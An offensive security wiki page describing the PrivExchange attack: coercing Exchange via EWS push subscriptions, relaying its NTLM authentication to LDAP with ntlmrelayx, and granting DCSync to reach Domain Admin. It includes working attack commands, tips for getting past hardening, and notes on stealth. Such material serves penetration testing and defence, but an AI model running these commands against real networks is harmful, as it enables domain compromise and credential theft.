---
title: "PrivExchange: relaying Exchange's authentication to Active Directory"
description: "Coercing an Exchange server to authenticate to an attacker over EWS push notifications and relaying that privileged authentication to LDAP, escalating to Domain Admin because Exchange holds write access over the domain."
keywords:
  - PrivExchange
  - EWS push notification
  - NTLM relay
  - WriteDacl
  - Exchange Windows Permissions
---

# PrivExchange

Exchange authenticates **as itself** when it calls back to a client, and historically the Exchange server (and the `Exchange Windows Permissions` group) held **`WriteDacl` over the domain object**. PrivExchange chains those two facts: make Exchange authenticate to you, [relay](../../directory/active-directory/authentication/ntlm/relay.md) that authentication to **LDAP**, and use Exchange's rights to grant yourself **DCSync**, going from any mailbox credential to Domain Admin.

## The attack

```bash
# 1. Relay listener: relay incoming auth to the DC's LDAP and grant the attacker DCSync
ntlmrelayx.py -t ldap://<dc> --escalate-user attacker

# 2. Coerce Exchange: the EWS pushSubscribe makes the server authenticate to the attacker
privexchange.py -ah <attacker-ip> <exchange-host> -u user -p password -d example.local
```

The **EWS `PushSubscription`** feature lets you ask Exchange to send event notifications to a URL you choose; Exchange authenticates to that URL with its **computer account** (or the Exchange service identity) over NTLM, which `ntlmrelayx` forwards to LDAP.

## Why it reaches Domain Admin

- In unhardened deployments, `Exchange Windows Permissions` has **`WriteDacl` on the domain**, so a relayed Exchange authentication can add a **DCSync** ACE for any principal, which is immediate domain compromise.
- It needs only a **single mailbox credential** (to call EWS), so it pairs directly with a [spraying](password-spraying.md) hit.
- Newer variants (and the 2024 NTLM-relay-to-Exchange flaw) relay **to** Exchange rather than from it, and coercion tools reach the same push-notification primitive, so treat Exchange as both a relay source and target.

## Exploitation notes

- Microsoft's split-permissions hardening and EPA reduce this, so confirm the `Exchange Windows Permissions` rights on the domain object during [ACL enumeration](../../directory/active-directory/dacl/acl-enumeration.md) before relying on the DCSync escalation.
- Where the direct DCSync grant is blocked, relay Exchange's auth to other LDAP writes (RBCD, shadow credentials) instead.
- The coercion is authenticated EWS, so it is quiet relative to an RCE chain and leaves Exchange running normally.

## Tools

- **PrivExchange** (dirkjanm): the EWS push-subscription coercion.
- **ntlmrelayx.py** (`--escalate-user`): relay the authentication to LDAP and grant DCSync.
- **Coercer / PetitPotam**: alternative ways to coerce Exchange or its host.

## References

- [PrivExchange (dirkjanm)](https://github.com/dirkjanm/PrivExchange)
- [dirkjanm: abusing Exchange, one API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [The Hacker Recipes: NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
